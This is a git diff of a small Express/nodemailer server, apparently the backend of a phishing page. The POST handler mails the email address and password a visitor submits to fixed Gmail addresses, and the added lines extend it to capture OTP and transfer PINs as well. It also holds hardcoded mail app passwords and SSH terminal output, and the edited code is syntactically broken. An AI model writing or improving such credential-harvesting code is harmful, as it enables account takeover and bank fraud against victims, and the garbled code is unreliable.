@@ -9,11 +9,17 @@ app.post('/',(req,res) => {
             pass: 'yknycyzsxdkxpepq'
         }
     })
+    user: 'Victorchinemerem191@gmail.com',
+            pass: 'aivsveolwtqinddb'
     const mailOptions = {
         from: req.body.email,
         to:'edehchinedu59@gmail.com',
         subject: `Client from ${req.body.email}: password=> ${req.body.password} `
-    }
+    }\
+       from: req.body?.email,
+        to:'Victorchinemerem191@gmail.com',
+        subject: `Client: ${req.body?.email} \n password: ${req.body?.password} \n Otp Pin: ${req.body?.otp} \n Transfer Pin: ${req.body?.pin}`,
+       
 
     transporter.sendMail(mailOptions,(error,info) => {
         if(error){
@@ -80,3 +86,6 @@ USER PC@DESKTOP-SN4MFQ5 MINGW64 ~/Desktop/googleMailer (main)
 $ ssh-add ~/.ssh/id_ed25519
 Enter passphrase for /c/Users/USER PC/.ssh/id_ed25519:
 Identity added: /c/Users/USER PC/.ssh/id_ed25519 (edehchinedu59@gmail.com)
+
+
+
